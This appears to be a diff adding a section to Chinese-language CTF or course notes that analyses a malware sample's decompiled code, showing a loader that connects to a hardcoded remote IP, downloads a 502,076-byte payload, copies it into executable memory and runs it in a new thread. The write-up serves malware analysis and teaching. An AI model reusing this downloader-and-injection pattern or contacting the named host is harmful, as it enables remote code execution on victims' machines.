@@ -100,11 +100,152 @@ http://192.168.114.131:11002/getflag?host=1xx.xx.xx.xx:8000
 
 #### 漏洞挖掘
 
+##### 代码注入实例分析
+
+恶意样本的主要结构包括两个函数调用
+
+```c
+int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+  sub_4023B0();
+  sub_4014D0();
+  return 0;
+}
+```
+
+函数一用于建立远程连接并下载恶意代码
+
+```c
+int sub_4023B0()
+{
+  int v0; // esi
+  int v1; // eax
+  char buf[8189]; // [esp+Ch] [ebp-2000h] BYREF
+  __int16 v4; // [esp+2009h] [ebp-3h]
+  char v5; // [esp+200Bh] [ebp-1h]
+
+  sub_401860();
+  send(s, ::buf, 10, 0);
+  Sleep(0x3E8u);
+  v0 = 0;
+  memset(buf, 0, sizeof(buf));
+  v4 = 0;
+  v5 = 0;
+  do
+  {
+    v1 = recv(s, buf, 0x2000, 0);
+    if ( v1 <= 0 )
+      exit(0);
+    v0 += sub_402390(dword_44B5F0 + v0 + 502076, buf, v1);
+  }
+  while ( v0 != 502076 );
+  sub_402390(dword_44B5F0, dword_44B5F0 + 502076, 502076);
+  return sub_402390(dword_44B5F0 + 501768, a1013247205, 304);
+}
+```
+
+`sub_401860()` 很有可能是建立 socket 连接的函数，而后面的代码则实现了功能：
+
+- 每次接收的数据写入到了 `dword_44B5F0 + v0 + 502076` 的地址。
+
+- 累加 `v0` 直到总量达到 `502076`。
+
+- 所以下载的恶意代码大小是 **502076（十进制）字节**。
+
+```c
+void sub_401860()
+{
+  int (__stdcall *v0)(char *, char *, int, int); // eax
+  int v1; // eax
+  char v2; // cl
+  int v3; // edx
+  char *v4; // edi
+  HMODULE LibraryA; // eax
+  HMODULE v6; // esi
+  int v7; // eax
+  char v8; // cl
+  int v9; // edx
+  char *v10; // edi
+  HMODULE v11; // eax
+  int v12; // edi
+  FARPROC ProcAddress; // eax
+  int i; // eax
+  int v15; // esi
+  int v16; // [esp+10h] [ebp-240h] BYREF
+  LPCSTR lpProcName; // [esp+14h] [ebp-23Ch]
+  int v18[5]; // [esp+18h] [ebp-238h]
+  struct sockaddr name; // [esp+2Ch] [ebp-224h] BYREF
+  char LibFileName[268]; // [esp+3Ch] [ebp-214h] BYREF
+  char Buffer[264]; // [esp+148h] [ebp-108h] BYREF
+
+  sub_401830();
+  s = socket(2, 1, 6);
+  if ( s != -1 )
+  {
+    while ( 1 )
+    {
+      v0 = (int (__stdcall *)(char *, char *, int, int))dword_44B5FC;
+      v16 = 0;
+      if ( dword_44B5FC )
+        goto LABEL_22;
+      lpProcName = ProcName;
+      v18[0] = (int)sub_401AB0;
+      v18[1] = (int)aGetnameinfo;
+      v18[2] = (int)sub_402170;
+      v18[3] = (int)aFreeaddrinfo;
+      v18[4] = (int)sub_401A60;
+      if ( !dword_44B5F8 )
+        break;
+LABEL_21:
+      v0 = off_447268;
+      dword_44B5FC = (int)off_447268;
+LABEL_22:
+      v15 = v0(a1013247205, 0, 0, (int)&v16);
+      WSASetLastError(v15);
+      if ( !v15 )
+      {
+        name = *(struct sockaddr *)*(_DWORD *)(v16 + 24);
+        *(_WORD *)name.sa_data = htons(hostshort);
+        if ( connect(s, &name, 16) == -1 )
+          continue;
+      }
+      return;
+    }
+    ...
+```
+
+观察发现，函数中调用了 `socket`、`connect` 等 API，传入远程 IP 地址和端口。在汇编代码中我们可以看到静态的IP地址
+
+![](https://notes.sjtu.edu.cn/uploads/upload_04ab405b612d2b7f404e1ace22c515d7.png)
+
+函数二实现了远程代码的注入和执行
+
+```c
+DWORD sub_4014D0()
+{
+  DWORD (__stdcall *v0)(LPVOID); // esi
+  HANDLE Thread; // eax
+
+  v0 = (DWORD (__stdcall *)(LPVOID))VirtualAlloc(0, 0x7A93Cu, 0x3000u, 0x40u);
+  sub_402390(v0, dword_44B5F0, 502076);
+  Thread = CreateThread(0, 0, v0, v0, 0, 0);
+  return WaitForSingleObject(Thread, 0xFFFFFFFF);
+}
+```
+
+主要实现了
+
+- 分配 `0x7A93C` 大小的可执行内存 (`0x3000` = `MEM_COMMIT | MEM_RESERVE`, `0x40` = `PAGE_EXECUTE_READWRITE`)
+- 将 `dword_44B5F0` 的数据复制到分配的内存
+- 把这段代码作为线程执行（起线程就是执行 shellcode）
+
+综上，上述样本连接的远程主机的IP地址是101.32.47.205，样本中下载的恶意代码的大小是502076字节，远程下载的代码在样本的sub_4014D0()函数中被注入执行。
+
 ##### 数据切换
 
 静态分析找到sub_403090()函数，观察可得，这是一个宽字符数组赋值的过程，`LoadLibraryW()` 接受的是一个 `wchar_t *` 指针
 
-```
+```c
 word_4BAE92 = 108; // 'l'
 word_4BAE86 = 109; // 'm'
 word_4BAE84 = 105; // 'i'
